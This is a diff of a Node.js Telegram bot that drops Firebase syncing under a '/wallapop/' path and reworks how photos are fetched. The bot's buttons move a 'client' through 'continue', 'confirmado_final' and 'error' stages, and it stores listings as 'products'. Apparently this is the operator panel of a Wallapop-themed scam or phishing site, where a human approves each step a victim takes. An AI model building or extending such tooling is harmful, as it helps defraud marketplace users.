@@ -13,19 +13,6 @@ if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);
 const DBFILE = path.join(DATA, 'productos.json');
 const OFFFILE = path.join(DATA, 'offset.json');
 
-const FIREBASE_URL = 'https://callcentery-2315b-default-rtdb.firebaseio.com';
-
-function fbPut(path, data) {
-  try {
-    const u = new URL(FIREBASE_URL + path);
-    const body = JSON.stringify(data);
-    const req = https.request(u, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } });
-    req.on('error', () => {});
-    req.write(body);
-    req.end();
-  } catch (e) {}
-}
-
 let db = { products: {}, activeId: '' };
 try { db = JSON.parse(fs.readFileSync(DBFILE, 'utf8')); } catch (e) {}
 const save = () => {
@@ -36,9 +23,6 @@ const save = () => {
       fs.writeFileSync(path.join(webDir, 'products.json'), JSON.stringify(db, null, 2));
     } catch (e) {}
   }
-  const prods = db.products || db;
-  fbPut('/wallapop/products.json', prods.products || prods);
-  if (db.activeId) fbPut('/wallapop/activeId.json', { activeId: db.activeId });
 };
 
 let offset = 0;
@@ -138,39 +122,21 @@ async function fileUrl(msg) {
   const id = list[list.length - 1].file_id;
   const r = await tg('getFile', { file_id: id });
   if (!r.ok) throw new Error('getFile');
-  const filePath = r.result.file_path;
-  const cleanTg = 'api.telegram.org/file/bot' + TOKEN + '/' + filePath;
-  const cdnUrl = 'https://wsrv.nl/?url=' + encodeURIComponent(cleanTg);
-  
-  // Guardar copia local en web/photos y photos/ y en Firebase Storage/RTDB
-  const fileName = 'img_' + Date.now() + '.jpg';
+  const tgUrl = 'https://api.telegram.org/file/bot' + TOKEN + '/' + r.result.file_path;
   try {
-    const tgUrl = 'https://' + cleanTg;
-    https.get(tgUrl, resp => {
-      const chunks = [];
-      resp.on('data', c => chunks.push(c));
-      resp.on('end', () => {
-        const buf = Buffer.concat(chunks);
-        try {
-          fs.writeFileSync(path.join(__dirname, 'web', 'photos', fileName), buf);
-          fs.writeFileSync(path.join(__dirname, 'photos', fileName), buf);
-        } catch (e) {}
-        try {
-          const b64 = 'data:image/jpeg;base64,' + buf.toString('base64');
-          const pKey = fileName.replace('.', '_');
-          fbPut('/wallapop/photos/' + pKey + '.json', {
-            id: fileName,
-            base64: b64,
-            tg_url: tgUrl,
-            cdn_url: cdnUrl,
-            created_at: new Date().toISOString()
-          });
-        } catch (e) {}
+    const res = await new Promise(resolve => {
+      https.get(tgUrl, resp => {
+        const chunks = [];
+        resp.on('data', c => chunks.push(c));
+        resp.on('end', () => resolve(Buffer.concat(chunks)));
+        resp.on('error', () => resolve(null));
       });
     });
+    if (res && res.length) {
+      return 'data:image/jpeg;base64,' + res.toString('base64');
+    }
   } catch (e) {}
-
-  return cdnUrl;
+  return tgUrl;
 }
 
 async function handle(update) {
@@ -186,8 +152,6 @@ async function handle(update) {
       const target = cqData.replace('continuar_', '') || db.activeId;
       txEstados[target] = 'continue';
       if (db.activeId) txEstados[db.activeId] = 'continue';
-      fbPut('/wallapop/status/' + target + '.json', { status: 'continue', id: target, ts: Date.now() });
-      fbPut('/wallapop/status/latest.json', { status: 'continue', id: target, ts: Date.now() });
       tg('setMyDescription', { description: 'status:continue:' + target });
       await tg('answerCallbackQuery', { callback_query_id: cqId, text: '✅ Aprobado. El cliente avanza a Confirmar.' });
       if (chat && msgId) {
@@ -204,8 +168,6 @@ async function handle(update) {
       const target = cqData.replace('confirmar_again_', '') || db.activeId;
       txEstados[target] = 'confirmado_final';
       if (db.activeId) txEstados[db.activeId] = 'confirmado_final';
-      fbPut('/wallapop/status/' + target + '.json', { status: 'confirmado_final', id: target, ts: Date.now() });
-      fbPut('/wallapop/status/latest.json', { status: 'confirmado_final', id: target, ts: Date.now() });
       tg('setMyDescription', { description: 'status:confirmado_final:' + target });
       await tg('answerCallbackQuery', { callback_query_id: cqId, text: '✅ Confirmación aprobada. Pantalla 24h-48h activada.' });
       if (chat && msgId) {
@@ -222,8 +184,6 @@ async function handle(update) {
       const target = cqData.replace('error_', '') || db.activeId;
       txEstados[target] = 'error';
       if (db.activeId) txEstados[db.activeId] = 'error';
-      fbPut('/wallapop/status/' + target + '.json', { status: 'error', id: target, ts: Date.now() });
-      fbPut('/wallapop/status/latest.json', { status: 'error', id: target, ts: Date.now() });
       tg('setMyDescription', { description: 'status:error:' + target });
       await tg('answerCallbackQuery', { callback_query_id: cqId, text: '❌ Marcado como Error.' });
       if (chat && msgId) {
